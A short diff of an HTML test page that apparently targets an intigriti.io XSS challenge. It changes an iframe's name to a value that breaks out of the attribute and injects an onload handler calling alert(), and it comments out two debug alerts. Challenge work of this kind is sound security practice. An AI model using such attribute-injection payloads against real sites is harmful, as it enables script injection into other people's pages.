@@ -3,7 +3,7 @@
     <script>
         var iframe = document.createElement("iframe");
         iframe.id = `6666`;
-        iframe.name = `helloworld`; 
+        iframe.name = `helloworld"onload="alert()`; 
         iframe.src = `https://challenge.intigriti.io/static/4/challenge1.png?`
         //iframe.src = `https://challenge.intigriti.io/static/4/challenge.png?q=alert(2)`;
         document.body.appendChild(iframe);
@@ -12,8 +12,8 @@
         document.getElementById('6666').style.border = '30px solid #000000';
         
         function codeAddress() {
-            alert(document.getElementsByTagName('iframe').length)
-            alert(document.getElementsByTagName('iframe')[0].name)
+//             alert(document.getElementsByTagName('iframe').length)
+//             alert(document.getElementsByTagName('iframe')[0].name)
 //             document.getElementsByName('iframe')[0].name = "newhelloworld";
         }
         window.onload = codeAddress;
